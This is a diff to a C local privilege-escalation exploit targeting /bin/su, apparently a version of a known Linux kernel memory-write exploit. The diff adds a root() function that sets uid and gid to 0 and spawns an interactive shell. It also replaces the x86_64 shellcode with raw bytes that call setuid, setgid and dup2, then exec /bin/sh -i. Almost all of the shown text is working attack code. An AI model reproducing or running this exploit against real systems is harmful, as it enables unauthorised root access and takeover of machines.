@@ -113,6 +113,14 @@ int recv_fd()
 	return fd;
 }
 
+void root()
+{
+	dup2(6, 2);
+	setuid(0);
+	setgid(0);
+	execl("/bin/sh", "sh", "-i", NULL);
+}
+
 int main(int argc, char **argv)
 {
 	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
@@ -145,6 +153,7 @@ int main(int argc, char **argv)
 			return -1;
 		}
 		printf("[+] Assigning fd %d to stderr.\n", fd);
+		dup2(2, 6);
 		dup2(fd, 2);
 /*
   Here is the asm from my /bin/su.
@@ -199,16 +208,16 @@ int main(int argc, char **argv)
 			"\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f"
 			"\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";
 #elif defined(__x86_64__)
-		// Shellcode from: http://www.shell-storm.org/shellcode/files/shellcode-77.php
 		char shellcode[] =
-			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
-			"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
-			"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
-			"\x58\x0f\x05";
+			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x40"
+			"\xb7\x06\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f\x2f\x62\x69"
+			"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xdb"
+			"\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50\x51\x57\x48"
+			"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";
 #else
 #error "That platform is not supported."
 #endif
-		printf("[+] Executing su with shellcode. There will be no prompt, so just type commands.\n");
+		printf("[+] Executing su with shellcode.\n");
 		execl("/bin/su", "su", shellcode, NULL);
 	} else {
 		sleep(0.01);
